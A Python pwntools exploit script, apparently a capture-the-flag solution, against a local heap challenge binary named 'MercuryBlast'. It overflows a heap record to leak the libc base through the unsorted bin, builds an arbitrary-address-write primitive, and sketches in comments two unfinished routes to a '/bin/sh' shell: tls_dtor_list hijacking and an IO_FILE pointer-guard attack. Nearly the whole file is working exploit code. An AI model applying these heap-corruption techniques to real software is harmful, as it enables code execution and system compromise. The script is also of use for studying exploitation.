#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set follow-fork-mode parent\n'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF("./MercuryBlast")
libc = ELF("./libc.so.6")
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])

def add_record(temp, size, data):
    sla("Your choice: ", "1")
    sla("Input Temperature:", str(temp))
    sla("Input Description Size: ", str(size))
    sa("Input Description: ", data)

def print_record():
    sla("Your choice: ", "2")
    # sla("Input Index:", str(idx))

def delete_record(idx):
    sla("Your choice: ", "3")
    sla("Input Index:", str(idx))

def edit_record(idx, temp, size, data):
    sla("Your choice: ", "4")
    sla("Input index: ", str(idx))
    sla("Input Temperature:", str(temp))
    sla("Input Description Size: ", str(size))
    sa("Input Description: ", data)

def blast(data):
    sla("Your choice: ", str('\x7f'))
    se(data)

read_bp = 0x167a

rol = lambda val, r_bits, max_bits: \
(val << r_bits%max_bits) & (2**max_bits-1) | \
((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def exp1():
    add_record("1.1", 0x100, "a") #0
    add_record("1.1", 0x100, "a") #1

    ## |Record_0|Data_0|Record_1|Data_0|TOP_CHUNK
    # debug()
    payload = b"a" * 0x100 + b"b" * 0x10 + p64(0) + p64(0x1000)
    edit_record(0, "1.1", 0x200, payload)
    print_record()

    ## 1. In order to have libc address appears on top of heap region,
    ## we need to inserted some heap chunks into unsorted bin.

    ## 2. The heap chunks we can created is of size 0x0 - 0x200,
    ## within the range of tcache, so we need to fullfill it at first.

    for i in range(0, 8):
        add_record("1.1", 0x100, "a") #2 - 9
    
    ## free 2 - 8
    for i in range(2, 9):
        delete_record(i)

    ## Where will chunk_9 be inserted into?
    add_record("1.1", 0x30, "a") #10
    delete_record(9)
    print_record()
    leak = ru('\x7f')
    libc_base = u64(leak[-5:] + b'\x7f\x00\x00') - 0x219ce0
    sys_addr = libc_base + libc.symbols["system"]

    log.success(hex(libc_base))
    log.success(hex(sys_addr))

     ## arbitrary address write
    def arw(addr, data):
        payload = b"a" * 0x100 + p64(0) + p64(0x21) + p64(0) + p64(0x1000) + p64(addr)
        edit_record(0, "1.1", 0x200, payload)
        edit_record(1, "1.1", 0x100, data)


    def tls_dtor_list_attack():
        ## Attack Path One: tls_dtor_list
        #1. Overwrite fs:[0x30] as a known value (e.g., 0x0), or leak fs:[0x30] 
        #2. Overwrite fs:[-0x58] to an address that we can control (say “hijacked_addr”), forge a tls_dtor_list there
        #3. Overwrite hijacked_addr->func as (&𝑠𝑦𝑠𝑡𝑒𝑚 ⊕ 𝑓𝑠:[0𝑥30])≪ 0𝑥11
        #4. Overwrite hijacked_addr->obj as &”/bin/sh”
        pass


    def IO_FILE_attack():
        ## Attack Path Two: IO File
        #1. overwirte stdout+0xe0 == &"/bin/sh"
        #2. overwirte stdout+0xe8 == &system << 0x11
        #3. overwirte tls+0x30 (pointer guard) == 0 
        #4. overwrite stdout+0xd8 ==  (make sure *(stdout+0xd8) + 0x38 == IO_cookie_read )
        pass


    tls_dtor_list_attack()
    # IO_FILE_attack()
    p.interactive()



p = process("./MercuryBlast")
exp1()